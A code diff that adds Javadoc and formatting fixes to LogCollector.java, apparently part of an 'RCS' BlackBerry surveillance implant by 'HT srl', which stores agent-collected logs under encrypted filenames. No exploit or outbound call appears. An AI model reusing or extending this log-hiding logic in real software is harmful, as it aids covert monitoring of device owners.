@@ -1,8 +1,8 @@
 /* *************************************************
  * Copyright (c) 2010 - 2010
  * HT srl,   All rights reserved.
- * Project      : RCS, RCSBlackBerry_lib 
- * File         : LogCollector.java 
+ * Project      : RCS, RCSBlackBerry_lib
+ * File         : LogCollector.java
  * Created      : 26-mar-2010
  * *************************************************/
 package blackberry.log;
@@ -30,12 +30,14 @@ import blackberry.utils.DebugLevel;
 import blackberry.utils.DoubleStringSortVector;
 import blackberry.utils.StringSortVector;
 
+// TODO: Auto-generated Javadoc
 /**
+ * The Class LogCollector.
  * 
  * @author user1
- * TODO Ordinare le cartelle e i file
+ *         TODO Ordinare le cartelle e i file
  */
-public class LogCollector implements Singleton {
+public final class LogCollector implements Singleton {
     //#debug
     private static Debug debug = new Debug("LogCollector", DebugLevel.VERBOSE);
 
@@ -57,16 +59,35 @@ public class LogCollector implements Singleton {
     // di
     // accesso
 
+    /**
+     * Decrypt name.
+     * 
+     * @param logMask
+     *            the log mask
+     * @return the string
+     */
     public static String decryptName(final String logMask) {
         return Encryption.decryptName(logMask, Keys.getInstance()
                 .getChallengeKey()[0]);
     }
 
+    /**
+     * Encrypt name.
+     * 
+     * @param logMask
+     *            the log mask
+     * @return the string
+     */
     public static String encryptName(final String logMask) {
         return Encryption.encryptName(logMask, Keys.getInstance()
                 .getChallengeKey()[0]);
     }
 
+    /**
+     * Gets the single instance of LogCollector.
+     * 
+     * @return single instance of LogCollector
+     */
     public static synchronized LogCollector getInstance() {
         if (instance == null) {
             instance = new LogCollector();
@@ -89,6 +110,9 @@ public class LogCollector implements Singleton {
 
     Keys keys;
 
+    /**
+     * Instantiates a new log collector.
+     */
     protected LogCollector() {
         super();
         logVector = new Vector();
@@ -109,7 +133,7 @@ public class LogCollector implements Singleton {
 
         if (obj == null) {
             // #debug info
-	debug.info("First time of logProgressivePersistent");
+            debug.info("First time of logProgressivePersistent");
             logProgressivePersistent.setContents(new Integer(1));
         }
 
@@ -118,6 +142,15 @@ public class LogCollector implements Singleton {
         return logProgressiveRet;
     }
 
+    /**
+     * Factory.
+     * 
+     * @param agent
+     *            the agent
+     * @param onSD
+     *            the on sd
+     * @return the log
+     */
     public synchronized Log factory(final Agent agent, final boolean onSD) {
         if (getLogNum() > MAX_LOG_NUM) {
             // #debug
@@ -130,6 +163,13 @@ public class LogCollector implements Singleton {
         return log;
     }
 
+    /**
+     * Gets the logs.
+     * 
+     * @param basePath
+     *            the base path
+     * @return the logs
+     */
     public Vector getLogs(final String basePath) {
         final Vector allLogs = new Vector();
 
@@ -158,12 +198,17 @@ public class LogCollector implements Singleton {
      * //NumberUtilities.toString(hidate, 16, 8); return newname; }
      */
 
+    /**
+     * Gets the new progressive.
+     * 
+     * @return the new progressive
+     */
     protected synchronized int getNewProgressive() {
         logProgressive++;
         logProgressivePersistent.setContents(new Integer(logProgressive));
 
         // #debug debug
-	debug.trace("Progressive: " + logProgressive);
+        debug.trace("Progressive: " + logProgressive);
         return logProgressive;
     }
 
@@ -179,6 +224,15 @@ public class LogCollector implements Singleton {
         return newname;
     }
 
+    /**
+     * Make new name.
+     * 
+     * @param log
+     *            the log
+     * @param agent
+     *            the agent
+     * @return the vector
+     */
     public synchronized Vector makeNewName(final Log log, final Agent agent) {
 
         final boolean onSD = agent.onSD();
@@ -192,8 +246,7 @@ public class LogCollector implements Singleton {
         final String basePath = onSD ? Path.LOG_PATH : Path.USER_PATH;
 
         final String blockDir = "_" + (progressive / LOG_PER_DIRECTORY);
-        final String fileName = progressive + "!"
-                + this.makeDateName(timestamp);
+        final String fileName = progressive + "!" + makeDateName(timestamp);
 
         final String encName = Encryption.encryptName(fileName + LOG_EXTENSION,
                 keys.getChallengeKey()[0]);
@@ -206,9 +259,15 @@ public class LogCollector implements Singleton {
         return vector;
     }
 
+    /**
+     * Removes the.
+     * 
+     * @param logName
+     *            the log name
+     */
     public void remove(final String logName) {
         // #debug info
-	debug.info("Removing file: " + logName);
+        debug.info("Removing file: " + logName);
         final AutoFlashFile file = new AutoFlashFile(logName, false);
         if (file.exists()) {
             file.delete();
@@ -227,9 +286,11 @@ public class LogCollector implements Singleton {
     }
 
     /**
-     * Restituisce la lista ordinata secondo il nome
+     * Restituisce la lista ordinata secondo il nome.
+     * 
      * @param currentPath
-     * @return
+     *            the current path
+     * @return the vector
      */
     public Vector scanForDirLogs(final String currentPath) {
         // #ifdef DBC
@@ -253,7 +314,7 @@ public class LogCollector implements Singleton {
                     vector.addElement(dir);
 
                 }
-                
+
                 vector.reSort();
             }
 
@@ -270,10 +331,13 @@ public class LogCollector implements Singleton {
     /**
      * Estrae la lista di log nella forma *.MOB dentro la directory specificata
      * da currentPath, nella forma 1_n
-     * 
      * Restituisce la lista ordinata secondo il nome demangled
+     * 
      * @param currentPath
-     * @return
+     *            the current path
+     * @param dir
+     *            the dir
+     * @return the vector
      */
     public Vector scanForLogs(final String currentPath, final String dir) {
         // #ifdef DBC
@@ -300,10 +364,10 @@ public class LogCollector implements Singleton {
                 if (file.endsWith(encLogMask)) {
                     // String encName = fcFile.getName();
                     // #debug debug
-	debug.trace("enc name: " + file);
+                    debug.trace("enc name: " + file);
                     final String plainName = decryptName(file);
                     // #debug debug
-	debug.trace("plain name: " + plainName);
+                    debug.trace("plain name: " + plainName);
 
                     vector.addElement(plainName, file);
                 }
@@ -322,11 +386,14 @@ public class LogCollector implements Singleton {
                 }
             }
         }
-        
+
         return vector.getValues();
     }
 
     //
+    /**
+     * Scan logs.
+     */
     public void scanLogs() {
         clear();
 
